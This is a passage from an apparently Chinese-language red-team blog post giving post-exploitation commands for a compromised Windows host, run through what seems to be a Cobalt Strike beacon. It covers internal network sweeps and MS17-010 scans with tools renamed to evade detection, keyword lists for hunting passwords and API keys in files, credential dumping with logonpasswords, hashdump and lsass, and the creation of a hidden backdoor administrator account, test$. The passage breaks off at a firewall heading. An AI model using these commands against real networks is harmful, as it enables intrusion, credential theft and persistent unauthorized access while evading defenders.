&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell for /l %i in (1,1,255) do @ping -n 1 -w 500 192.168.12.%i &amp;amp;&amp;amp; timeout /t 1 &amp;gt;null | find /i &amp;#34;ttl= &amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里看好有没有杀软edr再用，不然就是自首，除非你能二开工具。&lt;/p>
&lt;h3 id="1-利用betbios快速探测内网">1. 利用betbios快速探测内网&lt;/h3>
&lt;p>工具：Nbtscan&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/lifenjoiner/nbtscan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用cs可以直接上传该脚本。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715140127.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell nbscan.exe 10.10.20.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715140608.png" alt="image.png">&lt;/p>
&lt;h3 id="2-通过arp扫描完整探测内网">2. 通过arp扫描完整探测内网&lt;/h3>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/QbsuranAlang/arp-scan-windows-
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell arp.exe -t 10.10.20.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="3-通过arpscan脚本">3. 通过ARPScan脚本&lt;/h3>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Hackplayers/Empire-mod-Hackplayers/tree/master
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">通过ARP协议进行扫描。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">脚本名称：Invoke-ARPScan.ps1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">powershell-import
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">powershell Invoke-ARPScan -CIDR 10.10.20.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142613.png" alt="image.png">&lt;br>
上传上去：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142630.png" alt="image.png">&lt;br>
执行该命令即可：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142703.png" alt="image.png">&lt;/p>
&lt;h1 id="0x05-针对件内容的信息搜集">0x05 针对⽂件内容的信息搜集&lt;/h1>
&lt;p>当对内⽹束⼿⽆策的时候，⼊⼝机器上⾯说不定藏着突破⼝，翻找本地的⽂件和建⽴的⽹络连接就是⼿法&lt;br>
这⾥也提供⼀个⽂件内容敏感词的字典，需要可以⾃⼰去整理，如下:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">jdbc:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user=
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">password=
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">key=
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh-
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldap:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysqli_connect
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sk-
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x06-配置信息收集">0x06 配置信息收集&lt;/h1>
&lt;h3 id="1-web信息">1. web信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">run netstat -ano
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715142911.png" alt="image.png">&lt;/p>
&lt;h3 id="2-文档信息">2. 文档信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell dir /a /s /b c:\*.xls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell dir /a /s /b c:\*.doc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715143756.png" alt="image.png">&lt;/p>
&lt;h3 id="3-查看最近打开的文档">3. 查看最近打开的文档&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell dir %APPDATA%\Microsoft\Windows\Recent
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715143914.png" alt="image.png">&lt;/p>
&lt;h3 id="4-查看微信信息">4. 查看微信信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell dir /s /b c:\&amp;#34;WeChat Files&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715144017.png" alt="image.png">&lt;/p>
&lt;h1 id="0x07-网络资产搜集">0x07 网络资产搜集&lt;/h1>
&lt;h3 id="1-网络各种配置文件">1. 网络各种配置文件&lt;/h3>
&lt;p>通常再行动中，入口点都在泛OA，致OA，通OA，用NC等等。&lt;br>
用NC解密：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">下载地址：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/1amfine2333/ncDecode
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>致OA解密：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">下载地址：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/m4yfly/OA-Seeyou
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这些常见系统的配置文件地址要记住，如果是其他入口就多找找&lt;code>.config&lt;/code>文件&lt;br>
常见中间件及其配置目录：&lt;br>
默认安装：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>中间件&lt;/th>
&lt;th>目录1&lt;/th>
&lt;th>目录2&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>MySQL&lt;/td>
&lt;td>C:\ProgarmData\MySQL\MySQL Server&lt;/td>
&lt;td>C:\Progarm Files\MySQL\MySQL Server&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SQL Server&lt;/td>
&lt;td>C:\Progarm Files\Miscrosoft SQL Server\&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Oracle Database&lt;/td>
&lt;td>C:\app\oracle\product&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>PostgreSQL&lt;/td>
&lt;td>C:\Progarm Files\PostgreSQL&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Redis&lt;/td>
&lt;td>C:\Progarm Files\Redis&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Apache&lt;/td>
&lt;td>C:\Progarm Files\Apache Group&lt;/td>
&lt;td>C:\Progarm Files（x86）\Apache&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Nginx&lt;/td>
&lt;td>C:\nginx\conf&lt;/td>
&lt;td>C:\Progarm Files\Nginx\conf&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Tomacat&lt;/td>
&lt;td>C:\Progarm Files\Apache&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">C&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">\Users\XXX\Desktop&lt;/span> &lt;span class="c1">//用户桌面内容
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">\Users\XXX\Dowloads&lt;/span> &lt;span class="c1">//用户下载内容
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">\Users\XXX\Documents&lt;/span> &lt;span class="c1">//用户文档内容
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">\Users\XXX\AppData\Local&lt;/span> &lt;span class="c1">//用户软件信息【仅个人安装选项】
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x08-内网工具">0x08 内网工具&lt;/h1>
&lt;h3 id="1-fscan">1. fscan&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">下载地址：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/shadow1ng/fscan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">fscan -h 10.10.20.0/24 -np -no -p 445,3389
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-np on ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-pn 21指定不要扫描ftp端口，因为容易被查到
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以改名使用：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">最好改一下名字：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql.exe -i 10.10.20.0/24 -np -m netbios
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ms17010扫描:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mysql.exe -i 10.10.20.0/24 -np -m ms17010
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>常见端口扫描：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mysql.exe -i 10.10.20.0/24 -np -p 22,2222,3389,1433,3306,1521,5432,6379
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="2-kscan-轻量化全方位扫描器">2. Kscan-轻量化全方位扫描器&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">下载地址
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/lcvvvv/kscan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="3-dismap">3. dismap&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">下载地址：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/zhzyker/dismap
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715150212.png" alt="image.png">&lt;br>
原则就是：&lt;/p>
&lt;ol>
&lt;li>安静&lt;/li>
&lt;li>不被发现&lt;/li>
&lt;li>尽量用正常的协议&lt;/li>
&lt;li>尽量用改造过的工具&lt;/li>
&lt;/ol>
&lt;h1 id="0x09-密码凭证收集">0x09 密码凭证收集&lt;/h1>
&lt;h3 id="1-主机密码">1. 主机密码&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell logonpasswords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715150910.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell hashdump
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>dump lsass进程中的hash(巨龙拉东插件)&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">下载地址：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/k8gege/Ladon
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x10-用户操作相关">0x10 用户操作相关&lt;/h1>
&lt;h3 id="1-当前用户">1. 当前用户&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">一般用这个：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell echo %username%
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="2-收集用户信息">2. 收集用户信息&lt;/h3>
&lt;p>查看⽤户名，查看⽤户信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">net user
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user ⽤户名
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="3-在线户">3. 在线⽤户&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell query user
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="4-查看域管">4. 查看域管&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> shell net localgroup administrators
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="5-激活guest">5. 激活Guest&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net user guest /active:yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net user guest P@ssw0rd123
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net localgroup administrators guest /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net localgroup administrators
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="6-激活administrator">6. 激活administrator&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net user Administrator /active:yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net user Administrator P@ssw0rd123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="7-创建户">7. 创建⽤户&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net user ⽤户名 密码 /add #添加⽤户
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net localgroup administrators ⽤户名 /add #将⽤户加到管理组
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="8-创建后户">8. 创建后⻔⽤户&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell net user test$ P@ssw0rd123 /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net localgroup administrators test$ /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell net localgroup administrators
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x11-查看防墙相关">0x11 查看防⽕墙相关&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
